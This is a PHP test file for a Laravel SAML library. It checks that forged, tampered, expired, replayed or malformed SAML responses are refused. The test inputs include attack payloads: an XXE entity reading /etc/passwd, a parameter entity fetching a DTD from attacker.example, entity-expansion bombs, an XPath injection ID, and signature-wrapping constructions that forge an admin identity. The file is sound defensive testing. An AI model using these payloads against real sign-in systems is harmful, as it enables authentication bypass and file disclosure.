<?php

use Akcybex\LaravelSaml\Support\ArrayReplayStore;
use Akcybex\LaravelSaml\Tests\Support\SamlFixtures as Fx;
use Akcybex\LaravelSaml\Xml\SafeXml;
use RobRichards\XMLSecLibs\XMLSecurityDSig;
use RobRichards\XMLSecLibs\XMLSecurityKey;

// ---------------------------------------------------------------------------------------------------------------------------
// What is accepted
// ---------------------------------------------------------------------------------------------------------------------------

it('accepts a response signed on the assertion, the response or both', function (string $mode) {
    $assertion = $this->validateResponse(Fx::response(['signing' => $mode]));

    expect($assertion->id)->toBe('_assertion1')
        ->and($assertion->issuer)->toBe(Fx::IDP_ENTITY)
        ->and($assertion->nameId)->toBe('alice@example.com')
        ->and($assertion->nameIdFormat)->toBe(Fx::EMAIL_FORMAT)
        ->and($assertion->sessionIndex)->toBe('_session1')
        ->and($assertion->inResponseTo)->toBe(Fx::REQUEST_ID)
        ->and($assertion->notOnOrAfter->getTimestamp())->toBe(Fx::now()->modify('+300 seconds')->getTimestamp())
        ->and($assertion->attributes)->toBe(['mail' => ['alice@example.com'], 'groups' => ['admins', 'staff']]);
})->with(['assertion', 'response', 'both']);

it('returns the first value of an attribute, and null for one that is not there', function () {
    $assertion = $this->validateResponse(Fx::response());

    expect($assertion->attribute('mail'))->toBe('alice@example.com')
        ->and($assertion->attribute('groups'))->toBe('admins')
        ->and($assertion->attribute('missing'))->toBeNull();
});

it('returns no session index when the assertion has none', function () {
    $assertion = $this->validateResponse(Fx::response(['sessionIndex' => null]));

    expect($assertion->sessionIndex)->toBeNull();
});

it('returns no attributes for an assertion without an attribute statement', function () {
    $assertion = $this->validateResponse(Fx::response(['attributes' => []]));

    expect($assertion->attributes)->toBe([]);
});

it('accepts an answer signed with the second configured certificate (key rollover)', function () {
    $idp = Fx::idp([Fx::cert('attacker'), Fx::cert('idp')]);

    expect($this->validateResponse(Fx::response(), ['idp' => $idp])->nameId)->toBe('alice@example.com');
});

it('accepts an answer signed with the first configured certificate when a second is configured', function () {
    $idp = Fx::idp([Fx::cert('idp'), Fx::cert('attacker')]);

    expect($this->validateResponse(Fx::response(), ['idp' => $idp])->nameId)->toBe('alice@example.com');
});

it('accepts RSA-SHA384 and RSA-SHA512 signatures with matching digests', function (string $sigAlg, string $digest) {
    $response = Fx::response(['sigAlg' => $sigAlg, 'digest' => $digest]);

    expect($this->validateResponse($response)->nameId)->toBe('alice@example.com');
})->with([
    'sha384' => [XMLSecurityKey::RSA_SHA384, XMLSecurityDSig::SHA384],
    'sha512' => [XMLSecurityKey::RSA_SHA512, XMLSecurityDSig::SHA512],
]);

it('does not depend on the namespace prefixes the identity provider picked', function () {
    $assertion = $this->validateResponse(Fx::response(['saml2Prefixes' => true, 'signing' => 'both']));

    expect($assertion->nameId)->toBe('alice@example.com');
});

it('accepts a Response without an Issuer, since only the Assertion has to name one', function () {
    $assertion = $this->validateResponse(Fx::response(['responseIssuer' => null]));

    expect($assertion->issuer)->toBe(Fx::IDP_ENTITY);
});

it('trims the whitespace around the issuer and the NameID', function () {
    $assertion = $this->validateResponse(Fx::response(['assertionIssuer' => "\n  ".Fx::IDP_ENTITY."\n", 'nameId' => "\n  alice@example.com\n"]));

    expect($assertion->nameId)->toBe('alice@example.com');
});

it('accepts a NameID of 512 characters and refuses one of 513', function () {
    $this->validateResponse(Fx::response(['nameId' => str_repeat('a', 512)]));

    $this->assertRefused(Fx::response(['nameId' => str_repeat('a', 513)]), 'no usable NameID');
});

it('accepts the OneTimeUse and ProxyRestriction conditions', function () {
    $response = Fx::response(['conditionsExtra' => '<saml:OneTimeUse/><saml:ProxyRestriction Count="0"/>']);

    expect($this->validateResponse($response)->nameId)->toBe('alice@example.com');
});

it('accepts several audiences in one restriction when one is this service', function () {
    $response = Fx::response(['audienceRestrictions' => [['https://other.example.com', Fx::SP_ENTITY]]]);

    expect($this->validateResponse($response)->nameId)->toBe('alice@example.com');
});

it('accepts two restrictions when each includes this service', function () {
    $response = Fx::response(['audienceRestrictions' => [[Fx::SP_ENTITY], [Fx::SP_ENTITY, 'https://other.example.com']]]);

    expect($this->validateResponse($response)->nameId)->toBe('alice@example.com');
});

// ---------------------------------------------------------------------------------------------------------------------------
// Signatures
// ---------------------------------------------------------------------------------------------------------------------------

it('refuses an answer that is not signed at all', function () {
    $this->assertRefused(Fx::response(['signing' => 'none']), 'not signed');
});

it('refuses an answer signed with the attacker\'s key', function () {
    $response = Fx::response(['key' => Fx::key('attacker'), 'cert' => Fx::cert('attacker')]);

    $this->assertRefused($response, 'could not be verified');
});

it('refuses an answer signed with the attacker\'s key even when their certificate is embedded in KeyInfo', function () {
    $response = Fx::response(['key' => Fx::key('attacker'), 'cert' => Fx::cert('attacker'), 'includeCert' => true]);

    $this->assertRefused($response, 'could not be verified');
});

it('refuses when the identity provider has no certificate configured', function () {
    $this->assertRefused(Fx::response(), 'could not be verified', ['idp' => Fx::idp([])]);
});

it('refuses a NameID changed after signing', function (string $mode) {
    $response = Fx::response([
        'signing' => $mode,
        'after' => function (DOMDocument $document, DOMXPath $xpath) {
            Fx::node($xpath, '//saml:NameID')->nodeValue = 'admin@example.com';
        },
    ]);

    $this->assertRefused($response, ['could not be verified', 'digest of the signed element']);
})->with(['assertion', 'response', 'both']);

it('refuses an attribute changed after signing', function () {
    $response = Fx::response([
        'after' => function (DOMDocument $document, DOMXPath $xpath) {
            Fx::node($xpath, '//saml:Attribute[@Name="groups"]/saml:AttributeValue')->nodeValue = 'root';
        },
    ]);

    $this->assertRefused($response, ['could not be verified', 'digest of the signed element']);
});

it('refuses a validity window widened after signing', function () {
    $response = Fx::response([
        'conditionsNotOnOrAfter' => Fx::at(-1000),
        'after' => function (DOMDocument $document, DOMXPath $xpath) {
            Fx::node($xpath, '//saml:Conditions')->setAttribute('NotOnOrAfter', Fx::at(86400));
        },
    ]);

    $this->assertRefused($response, ['could not be verified', 'digest of the signed element']);
});

it('refuses an assertion changed after only the Response was signed', function () {
    $response = Fx::response([
        'signing' => 'response',
        'after' => function (DOMDocument $document, DOMXPath $xpath) {
            Fx::node($xpath, '//saml:NameID')->nodeValue = 'admin@example.com';
        },
    ]);

    $this->assertRefused($response, ['could not be verified', 'digest of the signed element']);
});

it('refuses a damaged signature value', function () {
    $response = Fx::response([
        'after' => function (DOMDocument $document, DOMXPath $xpath) {
            $value = Fx::node($xpath, '//ds:SignatureValue');
            $value->nodeValue = strrev((string) $value->nodeValue);
        },
    ]);

    $this->assertRefused($response, 'could not be verified');
});

// --- algorithms ------------------------------------------------------------------------------------------------------------

it('refuses an RSA-SHA1 signature by default and accepts it when SHA-1 is allowed', function () {
    $response = Fx::response(['sigAlg' => XMLSecurityKey::RSA_SHA1]);

    $this->assertRefused($response, 'signature algorithm is not accepted');

    expect($this->validateResponse($response, ['sha1' => true])->nameId)->toBe('alice@example.com');
});

it('refuses a SHA-1 digest by default and accepts it when SHA-1 is allowed', function () {
    $response = Fx::response(['digest' => XMLSecurityDSig::SHA1]);

    $this->assertRefused($response, 'digest algorithm is not accepted');

    expect($this->validateResponse($response, ['sha1' => true])->nameId)->toBe('alice@example.com');
});

it('refuses a signature algorithm it does not know', function (string $algorithm) {
    $response = Fx::response([
        'after' => function (DOMDocument $document, DOMXPath $xpath) use ($algorithm) {
            Fx::node($xpath, '//ds:SignatureMethod')->setAttribute('Algorithm', $algorithm);
        },
    ]);

    $this->assertRefused($response, 'signature algorithm is not accepted', ['sha1' => true]);
})->with([
    'hmac' => 'http://www.w3.org/2001/04/xmldsig-more#hmac-sha256',
    'md5' => 'http://www.w3.org/2001/04/xmldsig-more#rsa-md5',
    'ecdsa' => 'http://www.w3.org/2001/04/xmldsig-more#ecdsa-sha256',
    'nonsense' => 'urn:example:not-an-algorithm',
    'empty' => '',
]);

it('refuses a digest algorithm it does not know', function () {
    $response = Fx::response([
        'after' => function (DOMDocument $document, DOMXPath $xpath) {
            Fx::node($xpath, '//ds:DigestMethod')->setAttribute('Algorithm', 'http://www.w3.org/2001/04/xmldsig-more#md5');
        },
    ]);

    $this->assertRefused($response, 'digest algorithm is not accepted', ['sha1' => true]);
});

it('refuses canonicalization that keeps comments, and inclusive canonicalization', function (string $method) {
    $this->assertRefused(Fx::response(['c14n' => $method]), 'canonicalization method');
})->with([
    'exclusive with comments' => XMLSecurityDSig::EXC_C14N_COMMENTS,
    'inclusive' => XMLSecurityDSig::C14N,
    'inclusive with comments' => XMLSecurityDSig::C14N_COMMENTS,
]);

// --- what the signature covers -----------------------------------------------------------------------------------------------

it('refuses a Reference that points at another element', function (string $uri) {
    $response = Fx::response([
        'after' => function (DOMDocument $document, DOMXPath $xpath) use ($uri) {
            Fx::node($xpath, '/samlp:Response/saml:Assertion/ds:Signature//ds:Reference')->setAttribute('URI', $uri);
        },
    ]);

    $this->assertRefused($response, 'does not reference the element it is in');
})->with([
    'the Response, from the Assertion signature' => '#_response1',
    'an ID that does not exist' => '#_nobody',
    'the whole document' => '',
    'a bare fragment' => '#',
]);

it('refuses a Reference to another ID in a Response signature', function () {
    $response = Fx::response([
        'signing' => 'response',
        'after' => function (DOMDocument $document, DOMXPath $xpath) {
            Fx::node($xpath, '/samlp:Response/ds:Signature//ds:Reference')->setAttribute('URI', '#_assertion1');
        },
    ]);

    $this->assertRefused($response, 'does not reference the element it is in');
});

it('refuses a signature with two References', function () {
    $response = Fx::response([
        'after' => function (DOMDocument $document, DOMXPath $xpath) {
            $reference = Fx::node($xpath, '//ds:Reference');
            $reference->parentNode->appendChild($reference->cloneNode(true));
        },
    ]);

    $this->assertRefused($response, 'exactly one Reference');
});

it('refuses a signature with no Reference', function () {
    $response = Fx::response([
        'after' => function (DOMDocument $document, DOMXPath $xpath) {
            $reference = Fx::node($xpath, '//ds:Reference');
            $reference->parentNode->removeChild($reference);
        },
    ]);

    $this->assertRefused($response, 'exactly one Reference');
});

it('refuses a transform other than enveloped-signature and exclusive c14n', function (string $algorithm) {
    $response = Fx::response([
        'after' => function (DOMDocument $document, DOMXPath $xpath) use ($algorithm) {
            $transforms = Fx::node($xpath, '//ds:Transforms');
            $transform = $document->createElementNS(Fx::NS_DSIG, 'ds:Transform');
            $transform->setAttribute('Algorithm', $algorithm);
            $transforms->appendChild($transform);
        },
    ]);

    $this->assertRefused($response, 'transform that is not accepted');
})->with([
    'xpath' => 'http://www.w3.org/TR/1999/REC-xpath-19991116',
    'xslt' => 'http://www.w3.org/TR/1999/REC-xslt-19991116',
    'base64' => 'http://www.w3.org/2000/09/xmldsig#base64',
    'inclusive c14n' => 'http://www.w3.org/TR/2001/REC-xml-c14n-20010315',
]);

it('refuses a signature when the transform that was there is replaced by one that is not enveloped', function () {
    $response = Fx::response([
        'after' => function (DOMDocument $document, DOMXPath $xpath) {
            Fx::node($xpath, '//ds:Transform[@Algorithm="http://www.w3.org/2000/09/xmldsig#enveloped-signature"]')
                ->setAttribute('Algorithm', 'http://www.w3.org/2000/09/xmldsig#base64');
        },
    ]);

    $this->assertRefused($response, 'transform that is not accepted');
});

it('refuses a signed element that has no ID', function () {
    $response = Fx::response([
        'after' => function (DOMDocument $document, DOMXPath $xpath) {
            Fx::node($xpath, '//saml:Assertion')->removeAttribute('ID');
        },
    ]);

    $this->assertRefused($response, 'has no ID');
});

// --- signature wrapping ----------------------------------------------------------------------------------------------------

it('refuses a second Assertion with the attacker\'s NameID next to the signed one', function () {
    $response = Fx::response([
        'after' => function (DOMDocument $document, DOMXPath $xpath) {
            $original = Fx::node($xpath, '//saml:Assertion');

            // In front of the signed one, where a lazy "first Assertion" lookup would find it.
            $evil = $original->cloneNode(true);
            $document->documentElement->insertBefore($evil, $original);
            $evil->setAttribute('ID', '_evil');
            Fx::node($xpath, './/saml:NameID', $evil)->nodeValue = 'admin@example.com';
            $evil->removeChild(Fx::node($xpath, './ds:Signature', $evil));
        },
    ]);

    $this->assertRefused($response, 'exactly one Assertion');
});

it('refuses a second Assertion appended after the signed one', function () {
    $response = Fx::response([
        'after' => function (DOMDocument $document, DOMXPath $xpath) {
            $evil = Fx::node($xpath, '//saml:Assertion')->cloneNode(true);
            $evil->setAttribute('ID', '_evil');
            $document->documentElement->appendChild($evil);
        },
    ]);

    $this->assertRefused($response, 'exactly one Assertion');
});

it('refuses the signed Assertion cloned into a ds:Object', function () {
    $response = Fx::response([
        'after' => function (DOMDocument $document, DOMXPath $xpath) {
            $clone = Fx::node($xpath, '//saml:Assertion')->cloneNode(true);
            $object = $document->createElementNS(Fx::NS_DSIG, 'ds:Object');
            $object->appendChild($clone);
            Fx::node($xpath, '//saml:Assertion/ds:Signature')->appendChild($object);
        },
    ]);

    $this->assertRefused($response, 'exactly one Assertion');
});

it('refuses the signed Assertion cloned into samlp:Extensions', function () {
    $response = Fx::response([
        'after' => function (DOMDocument $document, DOMXPath $xpath) {
            $extensions = $document->createElementNS(Fx::NS_PROTOCOL, 'samlp:Extensions');
            $extensions->appendChild(Fx::node($xpath, '//saml:Assertion')->cloneNode(true));
            $document->documentElement->appendChild($extensions);
        },
    ]);

    $this->assertRefused($response, 'exactly one Assertion');
});

it('refuses an Assertion that is not a direct child of the Response', function () {
    $response = Fx::response([
        'after' => function (DOMDocument $document, DOMXPath $xpath) {
            $extensions = $document->createElementNS(Fx::NS_PROTOCOL, 'samlp:Extensions');
            $extensions->appendChild(Fx::node($xpath, '//saml:Assertion'));
            $document->documentElement->appendChild($extensions);
        },
    ]);

    $this->assertRefused($response, 'not a direct child');
});

it('refuses two elements that share an ID', function () {
    $response = Fx::response([
        'after' => function (DOMDocument $document, DOMXPath $xpath) {
            $element = $document->createElementNS(Fx::NS_PROTOCOL, 'samlp:Extensions');
            $element->setAttribute('ID', '_assertion1');
            $document->documentElement->appendChild($element);
        },
    ]);

    $this->assertRefused($response, 'same ID twice');
});

it('refuses a Response and an Assertion that share an ID', function () {
    $this->assertRefused(Fx::response(['responseId' => '_same', 'assertionId' => '_same']), 'same ID twice');
});

it('refuses a Signature moved from the Assertion up to the Response', function () {
    $response = Fx::response([
        'after' => function (DOMDocument $document, DOMXPath $xpath) {
            $signature = Fx::node($xpath, '//saml:Assertion/ds:Signature');
            $document->documentElement->appendChild($signature);
        },
    ]);

    $this->assertRefused($response, 'does not reference the element it is in');
});

it('ignores a Signature that is not a direct child of the Response or the Assertion', function () {
    $response = Fx::response([
        'after' => function (DOMDocument $document, DOMXPath $xpath) {
            $signature = Fx::node($xpath, '//saml:Assertion/ds:Signature');
            Fx::node($xpath, '//saml:Subject')->appendChild($signature);
        },
    ]);

    $this->assertRefused($response, 'not signed');
});

it('refuses an Assertion with two Signature elements', function () {
    $response = Fx::response([
        'after' => function (DOMDocument $document, DOMXPath $xpath) {
            $signature = Fx::node($xpath, '//saml:Assertion/ds:Signature');
            $signature->parentNode->appendChild($signature->cloneNode(true));
        },
    ]);

    $this->assertRefused($response, 'more than one');
});

it('refuses an ID that is not a valid XML name', function (string $id) {
    $this->assertRefused(Fx::response(['signing' => 'none', 'assertionId' => $id]), 'not a valid name');
})->with([
    'starts with a digit' => '1abc',
    'has a space' => 'a b',
    'xpath injection' => '_x"] | //*[@ID="',
    'quote' => "_a'b",
    'starts with a dash' => '-abc',
    'too long' => '_'.str_repeat('a', 300),
]);

it('refuses a Response ID that is not a valid XML name', function () {
    $this->assertRefused(Fx::response(['signing' => 'none', 'responseId' => '9lives']), 'not a valid name');
});

// ---------------------------------------------------------------------------------------------------------------------------
// The message itself
// ---------------------------------------------------------------------------------------------------------------------------

it('refuses an answer that is not valid base64', function () {
    $this->assertRefused('!!! not base64 !!!', 'not valid base64');
});

it('refuses an empty answer', function () {
    $this->assertRefused('', 'empty or too large');
});

it('refuses a document that is not well formed', function () {
    $this->assertRefused(base64_encode('<samlp:Response'), 'not well formed');
});

it('refuses a document larger than the limit', function () {
    $this->assertRefused(base64_encode(str_repeat('A', SafeXml::MAX_BYTES + 1)), 'too large');
});

it('refuses a message that is not a Response', function () {
    $xml = '<samlp:AuthnRequest xmlns:samlp="'.Fx::NS_PROTOCOL.'" ID="_x" Version="2.0"/>';

    $this->assertRefused(base64_encode($xml), 'not a SAML Response');
});

it('refuses a Response element in the wrong namespace', function () {
    $this->assertRefused(base64_encode('<Response xmlns="urn:example:other"/>'), 'not a SAML Response');
});

it('refuses a document with a DOCTYPE or entity declarations', function (string $xml) {
    $this->assertRefused(base64_encode($xml), 'document type declaration');
})->with([
    'entity expansion' => '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">]><samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">&lol2;</samlp:Response>',
    'external entity' => '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">&xxe;</samlp:Response>',
    'lower case' => '<!doctype html><samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"/>',
    'parameter entity' => '<!DOCTYPE foo [<!ENTITY % remote SYSTEM "http://attacker.example/x.dtd"> %remote;]><samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"/>',
]);

it('refuses a version other than 2.0 on the Response and on the Assertion', function () {
    $this->assertRefused(Fx::response(['version' => '1.1']), 'The Response is not SAML 2.0');
    $this->assertRefused(Fx::response(['assertionVersion' => '1.1']), 'The Assertion is not SAML 2.0');
});

it('refuses an encrypted assertion', function () {
    $response = Fx::response([
        'assertion' => false,
        'signing' => 'response',
        'responseExtra' => '<saml:EncryptedAssertion><xenc:EncryptedData xmlns:xenc="http://www.w3.org/2001/04/xmlenc#"/></saml:EncryptedAssertion>',
    ]);

    // Today the "exactly one Assertion" structure check fires first; either message is a refusal for the right reason.
    $this->assertRefused($response, ['Encrypted assertions are not supported', 'exactly one Assertion']);
});

it('refuses a Response with no Assertion at all', function () {
    $this->assertRefused(Fx::response(['assertion' => false, 'signing' => 'response']), ['exactly one Assertion', 'no Assertion']);
});

// ---------------------------------------------------------------------------------------------------------------------------
// Response level
// ---------------------------------------------------------------------------------------------------------------------------

it('refuses a Response addressed to another destination or to none', function (?string $destination) {
    $this->assertRefused(Fx::response(['signing' => 'both', 'destination' => $destination]), 'not addressed to this service');
})->with([
    'another service' => 'https://other.example.com/saml/acs',
    'the same host, another path' => 'https://sp.example.com/saml/other',
    'the same url with a trailing slash' => 'https://sp.example.com/saml/acs/',
    'none' => null,
    'empty' => '',
]);

it('refuses a status other than Success', function (string $status) {
    $this->assertRefused(Fx::response(['status' => $status]), 'did not report success');
})->with([
    'responder' => 'urn:oasis:names:tc:SAML:2.0:status:Responder',
    'requester' => 'urn:oasis:names:tc:SAML:2.0:status:Requester',
    'empty' => '',
]);

it('refuses a Response from another issuer', function () {
    $this->assertRefused(Fx::response(['responseIssuer' => 'https://evil.example.com/metadata']), 'The Response comes from a different issuer');
});

it('refuses an Assertion from another issuer', function () {
    $this->assertRefused(Fx::response(['assertionIssuer' => 'https://evil.example.com/metadata']), 'The Assertion comes from a different issuer');
});

it('refuses an Assertion with no issuer', function () {
    $this->assertRefused(Fx::response(['assertionIssuer' => null]), 'The Assertion comes from a different issuer');
});

// ---------------------------------------------------------------------------------------------------------------------------
// Audience and conditions
// ---------------------------------------------------------------------------------------------------------------------------

it('refuses an Assertion for another audience', function (array $restrictions) {
    $this->assertRefused(Fx::response(['audienceRestrictions' => $restrictions]), 'different audience');
})->with([
    'another service' => [[['https://other.example.com/metadata']]],
    'a near miss' => [[[Fx::SP_ENTITY.'/']]],
    'upper case' => [[[strtoupper(Fx::SP_ENTITY)]]],
    'an empty restriction' => [[[]]],
    'two restrictions, one lacks this service' => [[[Fx::SP_ENTITY], ['https://other.example.com/metadata']]],
    'two restrictions, the first lacks this service' => [[['https://other.example.com/metadata'], [Fx::SP_ENTITY]]],
]);

it('refuses an Assertion with no AudienceRestriction', function () {
    $this->assertRefused(Fx::response(['audienceRestrictions' => []]), 'names no audience');
});

it('refuses an Assertion with no Conditions', function () {
    $this->assertRefused(Fx::response(['conditions' => false]), 'no Conditions');
});

it('refuses Conditions with no NotOnOrAfter', function () {
    $this->assertRefused(Fx::response(['conditionsNotOnOrAfter' => null]), 'no end of validity');
});

it('refuses an Assertion whose Conditions have expired', function () {
    $this->assertRefused(Fx::response(['conditionsNotOnOrAfter' => Fx::at(-600)]), 'has expired');
});

it('refuses an Assertion that is used after its validity ended, by the clock given to validate()', function () {
    $this->assertRefused(Fx::response(), ['bearer confirmation', 'has expired'], ['now' => Fx::now()->modify('+1 hour')]);
});

it('refuses an Assertion that is not valid yet', function () {
    $this->assertRefused(Fx::response(['conditionsNotBefore' => Fx::at(600)]), 'not valid yet');
});

it('accepts Conditions without a NotBefore', function () {
    expect($this->validateResponse(Fx::response(['conditionsNotBefore' => null]))->nameId)->toBe('alice@example.com');
});

it('allows 119 seconds of clock skew after the end of validity, and not 120', function () {
    expect($this->validateResponse(Fx::response(['conditionsNotOnOrAfter' => Fx::at(-119)]))->nameId)->toBe('alice@example.com');

    $this->assertRefused(Fx::response(['conditionsNotOnOrAfter' => Fx::at(-120)]), 'has expired');
    $this->assertRefused(Fx::response(['conditionsNotOnOrAfter' => Fx::at(-121)]), 'has expired');
});

it('allows 120 seconds of clock skew before the start of validity, and not 121', function () {
    expect($this->validateResponse(Fx::response(['conditionsNotBefore' => Fx::at(120)]))->nameId)->toBe('alice@example.com');

    $this->assertRefused(Fx::response(['conditionsNotBefore' => Fx::at(121)]), 'not valid yet');
});

it('honours a clock skew that was configured', function () {
    $response = Fx::response(['conditionsNotOnOrAfter' => Fx::at(-30)]);

    expect($this->validateResponse($response, ['skew' => 60])->nameId)->toBe('alice@example.com');

    $this->assertRefused($response, 'has expired', ['skew' => 10]);
});

it('treats NotOnOrAfter as exclusive when there is no skew', function () {
    $this->assertRefused(Fx::response(['conditionsNotOnOrAfter' => Fx::at(0)]), 'has expired', ['skew' => 0]);

    expect($this->validateResponse(Fx::response(['conditionsNotOnOrAfter' => Fx::at(1)]), ['skew' => 0])->nameId)->toBe('alice@example.com');
});

it('refuses an Assertion issued in the future', function () {
    $this->assertRefused(Fx::response(['assertionIssueInstant' => Fx::at(300)]), 'issued in the future');
});

it('allows an IssueInstant within the clock skew ahead', function () {
    expect($this->validateResponse(Fx::response(['assertionIssueInstant' => Fx::at(120)]))->nameId)->toBe('alice@example.com');

    $this->assertRefused(Fx::response(['assertionIssueInstant' => Fx::at(121)]), 'issued in the future');
});

it('refuses a time that is not an xs:dateTime', function (string $value) {
    $this->assertRefused(Fx::response(['conditionsNotOnOrAfter' => $value]), 'not a valid time');
})->with(['a word' => 'tomorrow', 'a date only' => '2026-01-16', 'no zone' => '2026-01-16T12:00:00', 'a timestamp' => '1768478400']);

it('refuses an unknown condition element', function () {
    $this->assertRefused(Fx::response(['conditionsExtra' => '<saml:Condition/>']), 'not understood');
});

// ---------------------------------------------------------------------------------------------------------------------------
// Subject
// ---------------------------------------------------------------------------------------------------------------------------

it('refuses an empty NameID', function () {
    $this->assertRefused(Fx::response(['nameId' => '']), 'no usable NameID');
    $this->assertRefused(Fx::response(['nameId' => "  \n "]), 'no usable NameID');
});

it('refuses an Assertion with no NameID', function () {
    $this->assertRefused(Fx::response(['nameId' => null]), 'no usable NameID');
});

it('refuses a confirmation addressed to another recipient or to none', function (?string $recipient) {
    $this->assertRefused(Fx::response(['recipient' => $recipient]), 'bearer confirmation');
})->with(['another service' => 'https://other.example.com/saml/acs', 'none' => null]);

it('refuses a confirmation that has expired', function () {
    $this->assertRefused(Fx::response(['scdNotOnOrAfter' => Fx::at(-600)]), 'bearer confirmation');
});

it('refuses a confirmation with no NotOnOrAfter', function () {
    $this->assertRefused(Fx::response(['scdNotOnOrAfter' => null]), 'bearer confirmation');
});

it('refuses a confirmation that is not valid yet', function () {
    $this->assertRefused(Fx::response(['scdNotBefore' => Fx::at(600)]), 'bearer confirmation');
});

it('refuses an Assertion with no bearer confirmation', function () {
    $this->assertRefused(Fx::response(['subjectConfirmationMethod' => 'urn:oasis:names:tc:SAML:2.0:cm:holder-of-key']), 'bearer confirmation');
    $this->assertRefused(Fx::response(['subjectConfirmationData' => false]), 'bearer confirmation');
    $this->assertRefused(Fx::response(['subjectConfirmationMethod' => null]), 'bearer confirmation');
});

// ---------------------------------------------------------------------------------------------------------------------------
// Which request this answers
// ---------------------------------------------------------------------------------------------------------------------------

it('refuses a Response that answers another request', function () {
    $this->assertRefused(Fx::response(['responseInResponseTo' => '_someone_elses']), 'The Response answers a different request');
});

it('refuses a Response that answers no request when one is pending', function () {
    $this->assertRefused(Fx::response(['responseInResponseTo' => null]), 'The Response answers a different request');
});

it('refuses a confirmation that answers another request', function () {
    $this->assertRefused(Fx::response(['scdInResponseTo' => '_someone_elses']), 'The Assertion answers a different request');
});

it('refuses a confirmation that answers no request when one is pending', function () {
    $this->assertRefused(Fx::response(['scdInResponseTo' => null]), 'The Assertion answers a different request');
});

it('refuses an answer when no request is pending, unless IdP-initiated sign-in is allowed', function () {
    $response = Fx::response(['responseInResponseTo' => null, 'scdInResponseTo' => null]);

    $this->assertRefused($response, 'no pending sign-in request', ['expected' => null]);

    $assertion = $this->validateResponse($response, ['expected' => null, 'idpInitiated' => true]);

    expect($assertion->nameId)->toBe('alice@example.com')
        ->and($assertion->inResponseTo)->toBeNull();
});

it('refuses an answer to some request when none is pending, unless IdP-initiated sign-in is allowed', function () {
    $this->assertRefused(Fx::response(), 'no pending sign-in request', ['expected' => null]);
});

it('still checks everything else for an IdP-initiated answer', function () {
    $response = Fx::response(['responseInResponseTo' => null, 'scdInResponseTo' => null, 'signing' => 'none']);

    $this->assertRefused($response, 'not signed', ['expected' => null, 'idpInitiated' => true]);
});

// ---------------------------------------------------------------------------------------------------------------------------
// Replay
// ---------------------------------------------------------------------------------------------------------------------------

it('refuses the same assertion a second time', function () {
    $store = new ArrayReplayStore;
    $response = Fx::response();

    expect($this->validateResponse($response, ['store' => $store])->nameId)->toBe('alice@example.com');

    $this->assertRefused($response, 'already used', ['store' => $store]);
});

it('does not mix up two different assertions in the replay store', function () {
    $store = new ArrayReplayStore;

    $this->validateResponse(Fx::response(['assertionId' => '_first']), ['store' => $store]);

    expect($this->validateResponse(Fx::response(['assertionId' => '_second']), ['store' => $store])->id)->toBe('_second');
});

it('does not remember an assertion that was refused', function () {
    $store = new ArrayReplayStore;
    $response = Fx::response();

    // Refused first for being late, then presented in time: a refusal must not burn the id.
    $this->assertRefused($response, ['bearer confirmation', 'has expired'], ['store' => $store, 'now' => Fx::now()->modify('+1 hour')]);

    expect($this->validateResponse($response, ['store' => $store])->nameId)->toBe('alice@example.com');
});

it('does not remember an assertion that answered another request', function () {
    $store = new ArrayReplayStore;
    $response = Fx::response();

    $this->assertRefused($response, 'answers a different request', ['store' => $store, 'expected' => '_other']);

    expect($this->validateResponse($response, ['store' => $store])->id)->toBe('_assertion1');
});
